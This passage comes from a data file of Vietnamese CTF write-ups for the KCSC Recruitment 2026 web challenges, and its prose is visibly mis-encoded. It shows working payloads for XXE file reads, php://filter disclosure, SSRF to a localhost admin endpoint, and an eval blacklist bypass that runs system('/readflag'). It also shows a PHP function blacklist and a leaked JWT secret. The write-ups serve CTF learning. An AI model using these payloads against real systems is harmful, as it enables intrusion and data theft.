ƒë∆∞·ª£c th√¨ sao ^^\r\n\r\nV√† th·∫ø l√† m√¨nh m·ªü l·∫°i chall tr∆∞·ªõc r·ªìi g·ª≠i request l·∫•y file `JWT.php`\r\n\r\nTh√¥ng qua `compose.yaml` m√¨nh bi·∫øt ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa web n·∫±m ·ªü `/var/www/html`\r\n\r\n**compose.yaml**\r\n\r\n```yaml\r\nservices:\r\n  php-fpm:\r\n    build: ./php-fpm\r\n    volumes:\r\n      - ./src:/var/www/html\r\n    networks:\r\n      - kcsc-network\r\n\r\n  apache:\r\n    build: ./apache\r\n    ports:\r\n      - \"2019:80\"\r\n    volumes:\r\n      - ./src:/var/www/html\r\n    depends_on:\r\n      - php-fpm\r\n    networks:\r\n      - kcsc-network\r\n\r\nnetworks:\r\n  kcsc-network:\r\n    driver: bridge\r\n```\r\n\r\n**Payload**\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/utils/JWT.php\">]>\r\n\r\n<admin>&xxe;</admin>\r\n```\r\n\r\nDecode n·ªôi dung tr·∫£ v·ªÅ:\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce_Revenge/gfdgedrg.png)\r\n\r\n**Secret**: `b44a784d38b584cb651a2b47668cb7fbc9c351bf3d4d6029f1b27aa2196ac71d`\r\n\r\nSau khi m√¨nh th·ª≠ l·∫•y token th∆∞·ªùng ·ªü chall revenge v√† ∆∞·ªõm th·ª≠ v·ªõi secret key v·ª´a l·∫•y v·ªÅ th√¨ n√≥ ƒë√∫ng th·∫≠t :OOO\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Ka_Ce_Et_Ce_Revenge/wetwet.png)\r\n\r\nVi·ªác c√≤n l·∫°i c·ªßa m√¨nh ch·ªâ l√† ƒë·ªïi role th√†nh `admin` v√† gi·∫£i y h·ªát b·∫£n th∆∞·ªùng l√† s·∫Ω ra ƒë∆∞·ª£c flag\r\n\r\n**Flag**: `KCSC{0hh_w40000_m07_l4n_nu4_m1nh_l41_chuc_mun9_b4n_d4_7r0_7h4nh_m07_7h4nh_v13n_cu4_kc5c_nh0000}`\r\n",
        "tags": []
      },
      {
        "id": "Santas_Shop",
        "slug": "santas_shop",
        "title": "Santa's Shop",
        "category": "Web",
        "author": "duc193",
        "points": 50,
        "difficulty": "Very Easy",
        "readTime": "1 min",
        "date": "15-12-2025",
        "description": "Santa is selling Mystery Gift Boxes in the store, can you get it?",
        "content": "\r\n# TL;DR\r\n\r\nChallenge cho ta m·ªôt trang web c√≥ giao di·ªán ƒëƒÉng k√≠ v√† ƒëƒÉng nh·∫≠p t√†i kho·∫£n. M·ªói t√†i kho·∫£n khi ƒë∆∞·ª£c ƒëƒÉng k√≠ s·∫Ω ƒë∆∞·ª£c c·∫•p cho m·ªôt s·ªë ti·ªÅn v√† m·ª•c ti√™u c·ªßa ta l√† ph·∫£i mua ƒë∆∞·ª£c **Mystery Gift Box** v·ªõi gi√° c·∫Øt c·ªï ƒë·ªÉ l·∫•y flag\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop/Screenshot%202025-12-14%20210951.png)\r\n\r\n# Exploit and get flag\r\n\r\nƒê√¢y l√† b√†i d·ªÖ nh·∫•t c·ªßa gi·∫£i. ƒê∆°n gi·∫£n l√† t·∫°o t√†i kho·∫£n, ƒëƒÉng nh·∫≠p r·ªìi F12 l√™n t√¨m flag trong source l√† ƒë∆∞·ª£c\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop/Screenshot%202025-12-14%20210444.png)\r\n\r\n**Flag**:\r\n`KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`\r\n",
        "tags": []
      },
      {
        "id": "Santas_Shop_Revenge",
        "slug": "santas_shop_revenge",
        "title": "Santa's Shop Revenge",
        "category": "Web",
        "author": "duc193",
        "points": 50,
        "difficulty": "Easy",
        "readTime": "3 min",
        "date": "15-12-2025",
        "description": "Santa is selling Mystery Gift Boxes in the store, can you get it?",
        "content": "\r\n# TL;DR\r\n\r\nB√†i n√†y ƒë√£ kh√≥ h∆°n b√†i tr∆∞·ªõc, flag kh√¥ng c√≤n hi·ªán ·ªü trong source n·ªØa n√™n ta bu·ªôc ph·∫£i t√¨m c√°ch ƒë·ªÉ ki·∫øm sao cho ƒë·ªß ti·ªÅn ƒë·ªÉ mua ƒë∆∞·ª£c **Mystery Gift Box**\r\n\r\n# Initial reconnaissance\r\n\r\n·ªû tr√™n navbar c√≥ hai m·ª•c ƒë√°ng ch√∫ √Ω l√† `N·∫°p ti·ªÅn` v√† `Admin Dashboard` v·ªõi hai endpoint t∆∞∆°ng ·ª©ng l√† `/payment.php` v√† `/admin.php`\r\n\r\nKhi th·ª≠ v√†o c·∫£ hai c√°i th√¨ ta ƒë∆∞·ª£c k·∫øt qu·∫£ nh∆∞ sau\r\n\r\n**/payment.php**\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop_Revenge/Screenshot%202025-12-14%20213640.png)\r\n\r\n**/admin.php**\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop_Revenge/Screenshot%202025-12-14%20213817.png)\r\n\r\nNgo√†i ra khi b·∫Øt c√°c request b·∫±ng burp suite m√¨nh c≈©ng ƒë·ªÉ √Ω l√† c√°c c√°c asset ƒë·ªÅu ƒë∆∞·ª£c l·∫•y th√¥ng qua endpoint `file.php?image=`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop_Revenge/Screenshot%202025-12-14%20214053.png)\r\n\r\n# Exploit and get flag\r\n\r\nVi·ªác ƒë·∫ßu ti√™n m√¨nh l√†m l√† th·ª≠ d√πng endpoint `file.php?image=` ƒë·ªÉ truy c·∫≠p `admin.php`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop_Revenge/image.png)\r\n\r\nSau ƒë·∫•y m√¨nh c√≥ nh·∫≠p linh tinh ƒë·ªÉ xem c√≥ l·ªói g√¨ khai th√°c ƒë∆∞·ª£c kh√¥ng\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Santas_Shop_Revenge/ivjd.png)\r\n\r\nV·∫≠y l√† server s·∫Ω d√πng h√†m `file_get_contents($_['image'])` ƒë·ªÉ l·∫•y n·ªôi dung v·ªÅ sau ƒë√≥ s·∫Ω ch·∫∑n n·∫øu ph√°t hi·ªán trong n·ªôi dung tr·∫£ v·ªÅ c√≥ ch·ª©a `<?php`\r\n\r\nSau khi tra google ~~gemini~~ th√¨ m√¨nh bi·∫øt ƒë∆∞·ª£c l√† h√†m `file_get_contents` c√≥ hai thu·ªôc t√≠nh ƒë·∫∑c bi·ªát l√†:\r\n\r\n- H√†m s·∫Ω x·ª≠ l√Ω kh√°c nhau t√πy thu·ªôc v√†o ƒë·ªëi s·ªë c·ªßa n√≥ l√† **Url** hay **Local Path** c·ª• th·ªÉ:\r\n\r\n  - **Local Path**: H√†m s·∫Ω ƒë·ªçc to√†n b·ªô n·ªôi dung c·ªßa file nh∆∞ khi ta m·ªü b·∫±ng notepad v√† return n√≥\r\n\r\n  - **Url**: H√†m s·∫Ω g·ª≠i m·ªôt request get ƒë·∫øn url ƒë∆∞·ª£c cho v√†o v√† return n·ªôi dung c·ªßa request ƒë√≥\r\n\r\n- H√†m c√≥ h·ªó tr·ª£ **PHP Wrapper**\r\n\r\nSau ƒë√≥ m√¨nh ti·∫øn h√†nh ƒë·ªçc n·ªôi dung c·ªßa `admin.php` th√¥ng qua **Base64 filter** ƒë·ªÉ bypass WAF th√¨ ƒë∆∞·ª£c k·∫øt qu·∫£ k·∫øt qu·∫£ nh∆∞ sau\r\n\r\nPayload: `/file.php?image=php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dadmin.php`\r\n\r\n```\r\nHTTP/1.1 200 OK\r\nDate: Sun, 14 Dec 2025 15:13:19 GMT\r\nServer: Apache/2.4.65 (Debian)\r\nX-Powered-By: PHP/8.2.29\r\nVary: Accept-Encoding\r\nContent-Length: 1520\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nPD9waHANCnJlcXVpcmVfb25jZSAnY29uZmlnLnBocCc7DQokc2VjcmV0ID0gdHJpbShmaWxlX2dldF9jb250ZW50cygiL3NlY3JldC50eHQiKSk7DQppZiAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT09ICcxMjcuMC4wLjEnICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAnOjoxJykgew0KICAgIC8vIGh0dHBfcmVzcG9uc2VfY29kZSg0MDMpOw0KICAgIGRpZSgiQ2jhu4kgY8OzIHRo4buDIGPhuq1wIG5o4bqtdCBjb2luIHThu6sgbG9jYWxob3N0ICEiKTsNCn0NCg0KaWYgKCFpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgfHwgIWlzc2V0KCRfR0VUWydjb2luJ10pIHx8ICFpc3NldCgkX0dFVFsnc2VjcmV0J10pKSB7DQogICAgZGllKCJWdWkgbMOybmcgbmjhuq1wIHVzZXJuYW1lLCBjb2luIHbDoCBTRUNSRVQiKTsNCn0NCg0KaWYgKCRzZWNyZXQgIT09ICRfR0VUWydzZWNyZXQnXSl7DQogICAgZGllKCJTRUNSRVQgYuG6oW4gbmjhuq1wIGtow7RuZyBjaMOtbmggeMOhYy4iKTsNCn0NCg0KJHVzZXJuYW1lID0gdHJpbSgkX0dFVFsndXNlcm5hbWUnXSk7DQokY29pbiA9IChpbnQpJF9HRVRbJ2NvaW4nXTsNCg0KdHJ5IHsNCiAgICAkc3RtdCA9ICRjb25uLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHVzZXJzIFdIRVJFIHVzZXJuYW1lID0gPyIpOw0KICAgICRzdG10LT5leGVjdXRlKFskdXNlcm5hbWVdKTsNCiAgICAkdXNlciA9ICRzdG10LT5mZXRjaChQRE86OkZFVENIX0FTU09DKTsNCg0KICAgIGlmICghJHVzZXIpIHsNCiAgICAgICAgZGllKCJLaMO0bmcgdMOsbSB0aOG6pXkgdXNlcjogIiAuIGh0bWxzcGVjaWFsY2hhcnMoJHVzZXJuYW1lKSk7DQogICAgfQ0KDQogICAgJHN0bXQgPSAkY29ubi0+cHJlcGFyZSgiVVBEQVRFIHVzZXJzIFNFVCBjb2luID0gPyBXSEVSRSB1c2VybmFtZSA9ID8iKTsNCiAgICAkc3RtdC0+ZXhlY3V0ZShbJGNvaW4sICR1c2VybmFtZV0pOw0KDQogICAgZWNobyAixJDDoyBj4bqtcCBuaOG6rXQgY29pbiBjaG8gPGI+eyR1c2VybmFtZX08L2I+IHRow6BuaCA8Yj57JGNvaW59PC9iPiEiOw0KfSBjYXRjaCAoUERPRXhjZXB0aW9uICRlKSB7DQogICAgZWNobyAiRXJyb3I6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRlLT5nZXRNZXNzYWdlKCkpOw0KfQ0KPz4NCg==\r\n```\r\n\r\nDecode n·ªôi dung tr·∫£ v·ªÅ ta ƒë∆∞·ª£c:\r\n\r\n```php\r\n<?php\r\nrequire_once 'config.php';\r\n$secret = trim(file_get_contents(\"/secret.txt\"));\r\nif ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {\r\n    // http_response_code(403);\r\n    die(\"Ch·ªâ c√≥ th·ªÉ c·∫≠p nh·∫≠t coin t·ª´ localhost !\");\r\n}\r\n\r\nif (!isset($_GET['username']) || !isset($_GET['coin']) || !isset($_GET['secret'])) {\r\n    die(\"Vui l√≤ng nh·∫≠p username, coin v√† SECRET\");\r\n}\r\n\r\nif ($secret !== $_GET['secret']){\r\n    die(\"SECRET b·∫°n nh·∫≠p kh√¥ng ch√≠nh x√°c.\");\r\n}\r\n\r\n$username = trim($_GET['username']);\r\n$coin = (int)$_GET['coin'];\r\n\r\ntry {\r\n    $stmt = $conn->prepare(\"SELECT * FROM users WHERE username = ?\");\r\n    $stmt->execute([$username]);\r\n    $user = $stmt->fetch(PDO::FETCH_ASSOC);\r\n\r\n    if (!$user) {\r\n        die(\"Kh√¥ng t√¨m th·∫•y user: \" . htmlspecialchars($username));\r\n    }\r\n\r\n    $stmt = $conn->prepare(\"UPDATE users SET coin = ? WHERE username = ?\");\r\n    $stmt->execute([$coin, $username]);\r\n\r\n    echo \"ƒê√£ c·∫≠p nh·∫≠t coin cho <b>{$username}</b> th√†nh <b>{$coin}</b>!\";\r\n} catch (PDOException $e) {\r\n    echo \"Error: \" . htmlspecialchars($e->getMessage());\r\n}\r\n?>\r\n```\r\n\r\nPh√¢n t√≠ch source code, m√¨nh c√≥ nh·ªØng th√¥ng tin sau:\r\n\r\n- N·∫øu request kh√¥ng ƒë·∫øn t·ª´ ch√≠nh server th√¨ s·∫Ω ngay l·∫≠p t·ª©c b·ªã ch·∫∑n\r\n\r\n- Endpoint s·∫Ω l·∫•y 3 gi√° tr·ªã t·ª´ reuqest l√† `username`, `coin`, v√† `secret` v√† c·∫≠p nh·∫≠t gi√° tr·ªã `coin` c·ªßa `username` n·∫øu nh∆∞ `secret` l√† ch√≠nh x√°c\r\n\r\nSecret ƒë∆∞·ª£c so s√°nh s·∫Ω ƒë∆∞·ª£c l·∫•y ·ªü `/secret.txt`\r\n\r\n> `$secret = trim(file_get_contents(\"/secret.txt\"));`\r\n\r\nT∆∞∆°ng t·ª± m√¨nh l·∫•y n·ªôi dung c·ªßa `secret.txt` th√¥ng qua endpoint `file.php?image=`\r\n\r\n**Secret**: `ChiCon1BuocNuaThoi~_~`\r\n\r\nV√¨ h√†m `file_get_contents` h·ªó tr·ª£ vi·ªác g·ª≠i request qua url n√™n m√¨nh ch·ªâ c·∫ßn l·ª£i d·ª•ng n√≥ g·ª≠i request c·∫≠p nh·∫≠p database t·ª´ localhost c·ªßa m√°y ch·ªß l√† s·∫Ω c√≥ ƒë∆∞·ª£c s·ªë coin mong mu·ªën\r\n\r\nGi√° tr·ªã c·ªßa **image** khi ƒë√≥ s·∫Ω l√† `http://localhost/admin.php?username=abcd&coin=99999999&secret=ChiCon1BuocNuaThoi~_~`\r\n\r\nPayload cu·ªëi c√πng: `/file.php?image=http%3a%2f%2flocalhost%2fadmin.php%3fusername%3dabcd%26coin%3d99999999%26secret%3dChiCon1BuocNuaThoi~_~`\r\n\r\nG·ª≠i request v√† sau khi quay l·∫°i trang web ch·ªâ c·∫ßn mua **Mystery Gift Box** l√† s·∫Ω c√≥ ƒë∆∞·ª£c flag\r\n\r\n**Flag**: `KCSC{do_you_have_the_ctrl_u_key_to_get_flags_UwU}`\r\n",
        "tags": []
      },
      {
        "id": "SECURE_SHARE",
        "slug": "secure_share",
        "title": "SECURE SHARE",
        "category": "Web",
        "author": "Nightcore",
        "points": 50,
        "difficulty": "Medium",
        "readTime": "5 min",
        "date": "15-12-2025",
        "description": "QR Code Generator with security additions",
        "content": "\r\n# TL;DR\r\n\r\nTrang web cho ph√©p ng∆∞·ªùi d√πng t·∫°o ra qr d·ª±a tr√™n d·ªØ li·ªáu nh·∫≠p v√†o v√† x·ª≠ l√Ω g·∫ßn nh∆∞ m·ªçi th·ª© qua th·∫ª **{sys:gate}** v√† **{sys:qrcode}**. Hai th·∫ª ƒë√≥ s·∫Ω ƒë∆∞·ª£c b·∫Øt b·∫±ng Regex v√† l·∫•y n·ªôi dung b√™n trong ƒë·ªÉ x·ª≠ l√Ω. L·ªó h·ªïng n·∫±m ·ªü vi·ªác ta c√≥ th·ªÉ ch√®n m·ªôt ƒëo·∫°n code ƒë·ªôc h·∫°i v√†o m√† v·∫´n qua ƒë∆∞·ª£c c√°c filter ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c RCE\r\n\r\n> Th√∫ th·∫≠t b√†i n√†y m√¨nh nh√¨n ƒë·ªëng regex th·∫•y ƒë√°i qu√° m√¨nh v·ª©t cho AI gi·∫£i h·ªô lu√¥n -\\_- c∆° m√† m√¨nh c≈©ng s·∫Ω c·ªë g·∫Øng ƒë·ªÉ gi·∫£i th√≠ch nhi·ªÅu th·ª© nh·∫•t c√≥ th·ªÉ\r\n\r\n# Initial reconnaissance\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/SECURE_SHARE/sdgsdg.png)\r\n\r\nTrang web cho m√¨nh nh·∫≠p m·ªôt ƒëo·∫°n text b·∫•t k√¨ v√†o √¥ nh·∫≠p li·ªáu v√† khi g·ª≠i ƒëi m√¨nh s·∫Ω ƒë∆∞·ª£c m√£ QR c·ªßa ƒëo·∫°n text ƒë√≥\r\n\r\nNgh·ªãch ch√°n ch√™ kh√¥ng c√≥ g√¨ ƒë·∫∑c bi·ªát c·∫£ th√¨ m√¨nh m√≤ v√†o source xem c√≥ g√¨ kh√¥ng\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/SECURE_SHARE/cvfgergr.png)\r\n\r\n**Dockerfile**\r\n\r\n```DOCKERFILE\r\nCOPY flag.txt /flag.txt\r\nCOPY readflag.c /tmp/readflag.c\r\nRUN gcc /tmp/readflag.c -o /readflag && \\\r\n    chown root:root /flag.txt /readflag && \\\r\n    chmod 400 /flag.txt && \\\r\n    chmod 4755 /readflag && \\\r\n    rm /tmp/readflag.c\r\n\r\n```\r\n\r\nD·ª±a v√†o file docker th√¨ c√°ch duy nh·∫•t ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c `flag.txt` l√† ta ph·∫£i ch·∫°y ƒë∆∞·ª£c file `readflag` do docker c·∫•p quy·ªÅn\r\n\r\nChall ch·ªâ c√≥ hai file logic duy nh·∫•t l√† `index.php` v√† `security_filter.php`\r\n\r\n**index.php**\r\n\r\n```php\r\n<?php\r\n\r\nrequire_once 'security_filter.php';\r\n\r\nerror_reporting(0);\r\n\r\n\r\nif (isset($_GET['genqr']) && !empty($_GET['genqr'])) {\r\n    $text = substr($_GET['genqr'], 0, 200);\r\n    include('phpqrcode/qrlib.php');\r\n    header('Content-Type: image/png');\r\n    header('Cache-Control: no-cache, must-revalidate');\r\n    QRcode::png($text, false, QR_ECLEVEL_M, 8, 2);\r\n    exit;\r\n}\r\n\r\n$qr_url = '';\r\n$show_qr = false;\r\n\r\nif (isset($_GET['qr']) && !empty($_GET['qr'])) {\r\n    $qr_url = $_GET['qr'];\r\n    $show_qr = true;\r\n}\r\n\r\nif (isset($_POST['url']) && !empty($_POST['url'])) {\r\n    header('Location: ?qr=' . urlencode($_POST['url']));\r\n    exit;\r\n}\r\n\r\nfunction sys_pref_region()\r\n{\r\n    static $cached_region = null;\r\n    if ($cached_region !== null) {\r\n        return $cached_region;\r\n    }\r\n\r\n    if (isset($_GET['region'])) {\r\n        $r = $_GET['region'];\r\n\r\n        if (!preg_match('/^[a-z]+$/i', $r)) {\r\n            $r = 'en';\r\n        }\r\n        setcookie('sys_region', $r, time() + (86400 * 365), '/');\r\n    } elseif (isset($_COOKIE['sys_region'])) {\r\n        $r = $_COOKIE['sys_region'];\r\n        if (!preg_match('/^[a-z]+$/i', $r)) {\r\n            $r = 'en';\r\n        }\r\n    } else {\r\n        $r = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'en';\r\n        setcookie('sys_region', $r, time() + (86400 * 365), '/');\r\n    }\r\n\r\n    $cached_region = $r;\r\n    return $r;\r\n}\r\n\r\nfunction restoreMock($str)\r\n{\r\n    return $str;\r\n}\r\n\r\n\r\nclass AppEngine\r\n{\r\n\r\n    private function restorePreLabel($str)\r\n    {\r\n        return $str;\r\n    }\r\n\r\n\r\n    public function parse_qr_tags($content)\r\n    {\r\n        global $qr_url, $show_qr;\r\n\r\n        $pattern = '/\\{sys:qrcode(\\s+[^}]+)?\\}/';\r\n\r\n        if (preg_match_all($pattern, $content, $matches)) {\r\n            $count = count($matches[0]);\r\n            for ($i = 0; $i < $count; $i++) {\r\n                $html = '';\r\n\r\n                if ($show_qr && !empty($qr_url)) {\r\n                    $html = '<img src=\"?genqr=' . urlencode($qr_url) . '\" style=\"border:1px solid #0f0; padding:5px;\">';\r\n                } else {\r\n                    $html = '<form method=\"POST\" style=\"margin: 20px 0;\" autocomplete=\"off\">\r\n                        <input type=\"text\" name=\"url\" placeholder=\"Enter URL to generate QR code\" autocomplete=\"off\"\r\n                               style=\"width: 70%; padding: 12px; background: rgba(0, 20, 0, 0.8);\r\n                               border: 2px solid #0f0; color: #0f0; font-family: \\'Courier New\\', monospace;\r\n                               font-size: 1em; border-radius: 5px;\" required>\r\n                        <button type=\"submit\"\r\n                                style=\"padding: 12px 25px; background: rgba(0, 255, 0, 0.2);\r\n                                border: 2px solid #0f0; color: #0f0; cursor: pointer;\r\n                                font-family: \\'Courier New\\', monospace; font-size: 1em;\r\n                                border-radius: 5px; margin-left: 10px; transition: all 0.3s;\"\r\n                                onmouseover=\"this.style.background=\\'rgba(0, 255, 0, 0.4)\\'\"\r\n                                onmouseout=\"this.style.background=\\'rgba(0, 255, 0, 0.2)\\'\">\r\n                            Generate QR\r\n                        </button>\r\n                    </form>';\r\n                }\r\n\r\n                $content = str_replace($matches[0][$i], $html, $content);\r\n            }\r\n        }\r\n        return $content;\r\n    }\r\n\r\n    public function parse_logic_gates($content)\r\n    {\r\n        $pattern = '/\\{sys:gate\\(([^}^\\$]+)\\)\\}([\\s\\S]*?)\\{\\/sys:gate\\}/';\r\n\r\n        if (preg_match_all($pattern, $content, $matches)) {\r\n            $count = count($matches[0]);\r\n\r\n            for ($i = 0; $i < $count; $i++) {\r\n                $flag = '';\r\n                $out_html = '';\r\n\r\n\r\n                $white_fun = array('date', 'sys_pref_region');\r\n\r\n                $matches[1][$i] = $this->restorePreLabel($matches[1][$i]);\r\n\r\n\r\n                if (!security_check($matches[1][$i], $white_fun)) {\r\n                    die('Security violation detected!');\r\n                }\r\n\r\n                @eval ('if(' . $matches[1][$i] . '){$flag=\"if\";}else{$flag=\"else\";}');\r\n\r\n                if ($flag == 'if') {\r\n                    $out_html = $matches[2][$i];\r\n                }\r\n                $content = str_replace($matches[0][$i], $out_html, $content);\r\n            }\r\n        }\r\n        return $content;\r\n    }\r\n\r\n    public function render($tpl)\r\n    {\r\n        $tpl = $this->parse_qr_tags($tpl);\r\n        $tpl = $this->parse_logic_gates($tpl);\r\n        return $tpl;\r\n    }\r\n}\r\n\r\n\r\n\r\n$app = new AppEngine();\r\n$region = sys_pref_region();\r\n\r\n$_tpl = <<<HTML\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>KCSC SECURE SHARE v12 | KMA Cyber Security Club</title>\r\n    <style>\r\n</head>\r\n<body>\r\n    <div class=\"matrix-bg\"></div>\r\n    <div class=\"container\">\r\n        <div class=\"header\">\r\n            <img src=\"KCSC.jpg\" alt=\"KCSC Logo\" class=\"logo\">\r\n            <p class=\"club-name\">KCSC</p>\r\n            <h1>SECURE SHARE</h1>\r\n            <p class=\"subtitle\">{sys:gate(sys_pref_region()=='vn')}C√¥ng c·ª• t·∫°o m√£ QR{/sys:gate}{sys:gate(sys_pref_region()!='vn')}QR Code Generator{/sys:gate}</p>\r\n            <p style=\"margin-top: 10px;\"><a href=\"?region=en\" style=\"color: #0ff; text-decoration: none;\">üá∫üá∏ EN</a> | <a href=\"?region=vn\" style=\"color: #0ff; text-decoration: none;\">üáªüá≥ VN</a></p>\r\n        </div>\r\n        <div class=\"main-box\">\r\n            <div class=\"qr-section\">\r\n                <p>{sys:gate(sys_pref_region()=='vn')}Nh·∫≠p URL ƒë·ªÉ t·∫°o m√£ QR:{/sys:gate}{sys:gate(sys_pref_region()!='vn')}Enter URL to generate QR code:{/sys:gate}</p>\r\n                {sys:qrcode}\r\n                <input type=\"hidden\" id=\"current_url\" value=\"http://{$_SERVER['HTTP_HOST']}{$_SERVER['SCRIPT_NAME']}{$_SERVER['QUERY_STRING']}\">\r\n            </div>\r\n            <div style=\"display:none\">{sys:gate(1==0)} SYSTEM_HEALTHY {/sys:gate}</div>\r\n        </div>\r\n        <div class=\"footer\">\r\n            <p>¬© 2025 KCSC - KMA Cyber Security Club</p>\r\n        </div>\r\n    </div>\r\n    <script>\r\n        document.addEventListener('DOMContentLoaded', function() {\r\n            const matrixBg = document.querySelector('.matrix-bg');\r\n            for (let i = 0; i < 20; i++) {\r\n                const span = document.createElement('span');\r\n                span.style.position = 'absolute';\r\n                span.style.left = Math.random() * 100 + '%';\r\n                span.style.animationDelay = Math.random() * 2 + 's';\r\n                span.style.fontSize = Math.random() * 10 + 10 + 'px';\r\n                span.textContent = String.fromCharCode(0x30A0 + Math.random() * 96);\r\n                span.style.animation = 'fall 5s linear infinite';\r\n                span.style.color = '#0f0';\r\n                matrixBg.appendChild(span);\r\n            }\r\n        });\r\n    </script>\r\n</body>\r\n</html>\r\nHTML;\r\n\r\necho $app->render($_tpl);\r\n```\r\n\r\n**security_filter.php**\r\n\r\n```php\r\n<?php\r\n\r\n// Current security check function\r\nfunction security_check($input, $white_fun = [])\r\n{\r\n    if (preg_match_all('/([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\<\\>\\%\\w\\s\\\\\\\\]+)?\\(/i', $input, $matches2)) {\r\n        foreach ($matches2[1] as $value) {\r\n            if (function_exists(trim($value)) && !in_array($value, $white_fun)) {\r\n                return false;\r\n            }\r\n        }\r\n    }\r\n\r\n    $blacklist_pattern = '/(\\([\\w\\s\\.]+\\))|(\\$_GET\\[)|(\\$_POST\\[)|(\\$_REQUEST\\[)|(\\$_COOKIE\\[)|(\\$_SESSION\\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(require)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)|(strrev)|(substr)|(\\)\\s*\\()|(\\.)|(\\x5c)|(\\bnew\\b)|(Reflection)|(invoke)|(#)|(readfile)|(glob)|(scandir)|(var_dump)/i';\r\n\r\n    if (preg_match($blacklist_pattern, $input, $matches)) {\r\n        return false;\r\n    }\r\n\r\n    return true;\r\n}\r\n```\r\n\r\nS∆° qua v·ªÅ c√°ch ho·∫°t ƒë·ªông th√¨ m·ªçi th·ª© ban ƒë·∫ßu s·∫Ω ·ªü h·∫øt trong bi·∫øn `$_tpl` v√† web s·∫Ω l·∫•y c√°c d·ªØ li·ªáu ·ªü trong hai th·∫ª {sys:gate} v√† {sys:qrcode} b·∫±ng c√°ch s·ª≠ d·ª•ng **regex** v√† h√†m `preg_match_all()`\r\n\r\nTrong source code tr√™n m√¨nh th·∫•y xu·∫•t hi·ªán m·ªôt h√†m eval m√† c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë·ªÉ ch√®n h√†m ƒë·ªôc h·∫°i v√†o\r\n\r\n```php\r\n@eval ('if(' . $matches[1][$i] . '){$flag=\"if\";}else{$flag=\"else\";}');\r\n```\r\n\r\nNgo√†i ra c√≤n d√≤ng n√†y\r\n\r\n```php\r\n<input type=\"hidden\" id=\"current_url\" value=\"http://{$_SERVER['HTTP_HOST']}{$_SERVER['SCRIPT_NAME']}{$_SERVER['QUERY_STRING']}\">\r\n```\r\n\r\nTo√†n b·ªô input th√¥ c·ªßa m√¨nh tr√™n url sau d·∫•u ? hay tham s·ªë `$_SERVER['QUERY_STRING']` s·∫Ω ƒë∆∞·ª£c xu·∫•t hi·ªán ·ªü trong bi·∫øn `$_tpl` n√™n m√¨nh h∆∞·ªõng t·ªõi vi·ªác t√¨m c√°ch vi·∫øt sao cho `$matches[1][$i]` nh·∫≠n v√†o h√†m ƒë·ªôc h·∫°i m√† m√¨nh mu·ªën\r\n\r\n# Exploit and get flag\r\n\r\nƒê·∫øn ƒë√¢y th√¨ m√¨nh c≈©ng ƒë√£ c·ªë t√¨m hi·ªÉu ƒë·ªÉ l√†m c√°i wu cho ch·∫•t l∆∞·ª£ng t√≠ c∆° m√† ng·ªìi m√≤n ƒë√≠t m√¨nh v·∫´n kh√¥ng t√†i n√†o h√¨nh dung ra ƒë∆∞·ª£c c√°ch m√† c√°i regex filter v√† lu·ªìng x·ª≠ l√Ω c·ªßa h√†m `preg_match_all()` ho·∫°t ƒë·ªông nh∆∞ n√†o :(\r\n\r\n**Payload** ~~do Ai gen~~ cu·ªëi c√πng l√†:\r\n\r\n`?p={sys:gate(('implode')/**/('',['sys','tem'])/**/('/readflag'))}{/sys:gate}`\r\n\r\nƒê·ªÉ bi·∫øn `$matches[1][$i]` l·∫•y ch√≠nh x√°c payload c·ªßa m√¨nh th√¨ b·∫Øt bu·ªôc ph·∫£i g·ª≠i request th√¥ m√† kh√¥ng qua encode url\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/SECURE_SHARE/yty45y.png)\r\n\r\n**Flag**: `KCSC{m0t_lan_nua_ban_da_lam_duoc_g00d_j0bbb!!!}`\r\n",
        "tags": []
      },
      {
        "id": "silver",
        "slug": "silver",
        "title": "silver",
        "category": "Web",
        "author": "dunvu0",
        "points": 388,
        "difficulty": "Medium",
        "readTime": "7 min",
        "date": "15-12-2025",
        "description": "Can you catch Lugia? :D",
